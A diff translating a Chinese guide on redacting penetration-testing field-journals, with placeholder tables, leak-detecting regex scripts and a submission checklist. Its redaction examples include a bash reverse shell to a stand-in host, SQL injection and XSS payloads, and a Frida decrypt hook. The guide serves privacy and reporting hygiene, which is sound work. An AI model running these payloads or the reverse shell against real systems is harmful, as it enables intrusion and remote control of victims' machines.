@@ -1,107 +1,107 @@
-# Field-Journal 脱敏规范
+#Field-Journal desensitization specification
 
-> 写 field-journal、提交 PR、分享 payload、对外发报告时**必须脱敏**。下面这套占位符规范借鉴自 PentAGI 多 agent 系统的 anonymization 协议，目标是：**保留可复用价值的同时，不暴露真实目标**。
+> Desensitization is required when writing field-journal, submitting PR, sharing payload, and sending reports to external parties. The following set of placeholder specifications are borrowed from the anonymization protocol of the PentAGI multi-agent system. The goal is to: **retain reusable value without exposing the real target**.
 
-## 占位符总表
+## Summary list of placeholders
 
-### 网络与主机
+### Network and Host
 
-| 类型 | 占位符 | 适用场景 |
+| Type | Placeholder | Applicable scenarios |
 |------|-------|---------|
-| 目标 IP | `{target_ip}` | 渗透目标主机 |
-| 受害方 IP | `{victim_ip}` | 内网横向移动中的下一跳 |
-| 远程主机 | `{remote_host}` | 通用远程地址 |
-| 服务器 IP | `{server_ip}` | C2 / 中转 / 公网回连 |
-| 回调域名 | `{callback_domain}` | OOB / 反弹 |
-| 目标域名 | `{target_domain}` | Web / 邮件目标 |
-| 受害域名 | `{victim_domain}` | 内网域名 |
-| 自定义端口 | `{port}` | 非标准端口 |
-| 标准端口 | 保留原值 | 80 / 443 / 22 / 445 / 3389 等保留，便于复用 |
+| Target IP | `{target_ip}` | Infiltrate target host |
+| Victim IP | `{victim_ip}` | Next hop in intranet lateral movement |
+| Remote host | `{remote_host}` | Universal remote address |
+| Server IP | `{server_ip}` | C2 / Transit / Public Network Backlink |
+| Callback Domain Name | `{callback_domain}` | OOB/Bounce |
+| Destination Domain Name | `{target_domain}` | Web / Email Destination |
+| Victim domain name | `{victim_domain}` | Intranet domain name |
+| Custom port | `{port}` | Non-standard port |
+| Standard port | Keep the original value | 80 / 443 / 22 / 445 / 3389, etc. are reserved for easy reuse |
 
-### 凭证与密钥
+### Credentials and Keys
 
-| 类型 | 占位符 |
+| type | placeholder |
 |------|-------|
-| 用户名 | `{username}` |
-| 密码 | `{password}` |
-| 哈希值 | `{hash}` |
-| 会话 token | `{token}` |
+| Username | `{username}` |
+| Password | `{password}` |
+| Hash value | `{hash}` |
+| session token | `{token}` |
 | API key | `{api_key}` |
 | Cookie | `{cookie}` |
 | Bearer | `{bearer_token}` |
 
-### URL 与端点
+### URLs and endpoints
 
-| 类型 | 占位符 |
+| type | placeholder |
 |------|-------|
-| 通用 URL | `{url}` |
-| API 端点 | `{api_endpoint}` |
-| 回调 URL | `{callback_url}` |
-| 上传点 | `{upload_endpoint}` |
-| 登录接口 | `{login_endpoint}` |
+| Universal URL | `{url}` |
+| API endpoint | `{api_endpoint}` |
+| Callback URL | `{callback_url}` |
+| Upload point | `{upload_endpoint}` |
+| Login interface | `{login_endpoint}` |
 
-### 路径
+### Path
 
-| 类型 | 占位符 |
+| type | placeholder |
 |------|-------|
-| 安装目录 | `{install_dir}` |
-| 配置文件 | `{config_path}` |
-| Web 根 | `{webroot}` |
-| 上传目录 | `{upload_dir}` |
-| 日志路径 | `{log_path}` |
+| Installation directory | `{install_dir}` |
+| Configuration file | `{config_path}` |
+| Web Root | `{webroot}` |
+| Upload directory | `{upload_dir}` |
+| Log path | `{log_path}` |
 
-### 业务标识
+### Business ID
 
-| 类型 | 占位符 |
+| type | placeholder |
 |------|-------|
-| 真实姓名 | `{user_name}` |
-| 邮箱 | `{user_email}` |
-| 手机号 | `{phone}` |
-| 工号 | `{employee_id}` |
-| 订单号 | `{order_id}` |
+| Real name | `{user_name}` |
+| Email | `{user_email}` |
+| Mobile phone number | `{phone}` |
+| Job number | `{employee_id}` |
+| Order number | `{order_id}` |
 | UUID | `{uuid}` |
 
-## 不要脱敏的东西
+## Don’t use desensitizing things
 
-为了保留经验的可复用性，下列内容**不要替换**：
+In order to preserve the reusability of the experience, the following should not be replaced:
 
-- CVE 编号（`CVE-2024-1234`）
-- 工具名与版本（`sqlmap 1.7.10`）
-- 标准端口（80 / 443 / 445 / 1433 / 3306 等）
-- 公开的 OS 版本（`Windows Server 2019`、`Ubuntu 22.04`）
-- 通用 payload 模板（`<script>alert(1)</script>`、`' OR 1=1--`）
-- 库名与函数名（`OpenSSL`、`memcpy`、`strncpy`）
-- 协议名与字段名（`Kerberos AS-REQ`、`LDAP bind`）
+- CVE number (`CVE-2024-1234`)
+- Tool name and version (`sqlmap 1.7.10`)
+- Standard ports (80/443/445/1433/3306 etc.)
+- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
+- Universal payload template (`<script>alert(1)</script>`, `' OR 1=1--`)
+- Library name and function name (`OpenSSL`, `memcpy`, `strncpy`)
+- Protocol name and field name (`Kerberos AS-REQ`, `LDAP bind`)
 
-## 上下文保留原则
+## Context retention principle
 
-替换时**保留语义结构**，让别人看到也知道这是什么：
+When replacing, **preserve the semantic structure** so that others can see what it is and know what it is:
 
 ```python
-# ❌ 全替换成 X，看不出语义
+# ❌ Replace everything with X, can't see the meaning
 target = "X"
 url = "X/X"
 
-# ❌ 替换太通用
+# ❌ Replacement is too generic
 target = "{target}"
 url = "{url}"
 
-# ✅ 保留上下文
+# ✅ Keep the context
 target_ip = "{target_ip}"           # 192.168.10.50
 target_url = "{target_url}/admin"   # https://corp.example.com/admin
 admin_token = "{admin_session_token}"  # eyJhbGciOi...
 ```
 
-## Payload 脱敏
+## Payload Desensitization
 
 ### Web payload
 
 ```
-原始: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
+Original: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
       Host: shop.victim-corp.cn
       Cookie: PHPSESSID=abcdef123456
 
-脱敏: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
+Desensitized: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
       Host: {target_domain}
       Cookie: PHPSESSID={session_id}
 ```
@@ -109,81 +109,81 @@ admin_token = "{admin_session_token}"  # eyJhbGciOi...
 ### Shell payload
 
 ```bash
-# 原始
+# Original
 bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'
 
-# 脱敏
+# Desensitization
 bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
 ```
 
-### Frida hook 脚本
+### Frida hook script
 
 ```javascript
-// 原始
+// Original
 Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
     var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
     ...
 };
 
-// 脱敏
+// Desensitize
 Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
     var result = this.decrypt("{sample_ciphertext}");
     ...
 };
 ```
 
-## 二进制样本脱敏
+##Binary sample desensitization
 
-### 哈希
+### Hash
 
-记录 sha256 即可，**不要附原文件**。如果必须共享样本：
+Just record sha256, **do not attach the original file**. If you must share samples:
 
-- 上 VirusTotal 或 MalwareBazaar 公开样本库
-- 链接到他人已分析过的同 hash 样本
+- Go to VirusTotal or MalwareBazaar public sample repository
+- Link to the same hash sample that has been analyzed by others
 
-### 字符串与符号
+### Strings and symbols
 
 ```c
-// 原始
+// Original
 char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
 const char *api = "https://api.target-corp.com/v3/auth";
 
-// 脱敏
+// Desensitize
 char *secret = "Bearer {hardcoded_jwt}";
 const char *api = "{api_endpoint}";
 ```
 
-## 截图脱敏
+## Screenshot desensitization
 
-- 用马赛克或纯黑遮挡：用户名、邮箱、电话、订单号、姓名
-- URL 栏只露域名结构（保留路径，遮 host），或全替换
-- 内网 IP 段保留前两段：`10.0.x.x` 而不是 `10.0.10.50`
-- 标识企业身份的图片元素（logo / 水印）必须遮
+- Use mosaic or pure black to cover: username, email, phone number, order number, name
+- The URL column only shows the domain name structure (keep the path, cover the host), or replace it entirely
+- Keep the first two segments of the intranet IP segment: `10.0.x.x` instead of `10.0.10.50`
+- Picture elements that identify the company’s identity (logo/watermark) must be covered
 
-## CTF 场景特例
+## CTF scene special case
 
-CTF 题目题面、靶机 hostname、flag 格式**通常不算敏感**（靶机是公开题），但：
+The CTF question title, drone hostname, and flag format are usually not sensitive** (the drone is a public question), but:
 
-- 自部署的私有靶场要按真实环境对待
-- 比赛结束前的 flag 不能公开
-- 别人未公开的解法不要直接抄到 field-journal
+- Self-deployed private shooting ranges should be treated as real environments
+- The flag before the end of the game cannot be made public
+- Do not copy other people’s unpublished solutions directly into field-journal
 
-## 自动检测脚本
+## Automatic detection script
 
-写 field-journal 后跑一遍下面的正则，找出漏脱敏：
+After writing field-journal, run the following regular rules to find out the missing desensitization:
 
 ```powershell
 # Windows PowerShell
 $file = "field-journal/2026-05-15_xxx.md"
 $content = Get-Content $file -Raw
 
-# 公网 IPv4
+# Public IPv4
 [regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }
 
-# 邮箱
+# Email
 [regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }
 
-# 中国大陆手机号
+# Mainland China Mobile Number
 [regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }
 
 # JWT
@@ -191,36 +191,34 @@ $content = Get-Content $file -Raw
 ```
 
 ```bash
-# Bash / Linux 等价
+# Bash / Linux Equivalent
 grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
 grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
 grep -nE '\b1[3-9][0-9]{9}\b' file.md
 ```
 
-已封装为 `references/scripts/scan-leaks.ps1`（PowerShell，PS 5.1 / pwsh 兼容），每次提交前跑：
-```powershell
+It has been packaged as `references/scripts/scan-leaks.ps1` (PowerShell, PS 5.1 / pwsh compatible), run before each submission:```powershell
 powershell -File references/scripts/scan-leaks.ps1 -Path references/field-journal
+```CI (ci.yml `leak-scan` job) has been connected to this script and will fail directly if it finds that the information has not been desensitized.
+
+## Reverse: read other people’s desensitization documents
+
+When looking at other people's field-journal/writeup, if you encounter placeholders such as `{target_ip}`, **do not replace it with the real value of your own environment before committing**, just keep the placeholder unchanged.
+
+## Field-Journal must check items
+
+Check this checklist before submitting field-journal:
+
 ```
-CI（ci.yml `leak-scan` job）已接入该脚本，发现未脱敏信息会直接失败。
-
-## 反向：阅读他人脱敏文档
-
-看别人的 field-journal / writeup 时，遇到 `{target_ip}` 这类占位符，**不要替换成你自己环境的真实值再 commit**，保持占位符不变即可。
-
-## Field-Journal 必查项
-
-提交 field-journal 前对照这个 checklist：
-
-```
-□ 没有公网 IP（除了 CDN / 公开服务）
-□ 没有真实域名（除了 example.com 等示范域）
-□ 没有真实凭证 / token / hash（已替换为 {placeholder}）
-□ 没有截图里漏出的姓名 / 工号 / 邮箱
-□ 没有 sample 文件本身（只留 sha256）
-□ JWT / OAuth code / API key 全替换
-□ 内网 IP 段已模糊到前两段（10.0.x.x）
-□ Payload 里的目标参数已替换为通用占位符
-□ Cookie 与 session id 已替换
+□ No public IP (except CDN/public services)
+□ No real domain name (except for example domains such as example.com)
+□ No real credentials/token/hash (replaced with {placeholder})
+□ There is no name/employee number/email address leaked in the screenshot
+□ There is no sample file itself (only sha256 is left)
+□ JWT / OAuth code / API key full replacement
+□ The intranet IP segment has been blurred to the first two segments (10.0.x.x)
+□ The target parameters in Payload have been replaced with universal placeholders
+□ Cookie and session id have been replaced
 ```
 
-把这个 checklist 直接补到 `field-journal/_template.md` 末尾。
+Add this checklist directly to the end of `field-journal/_template.md`.
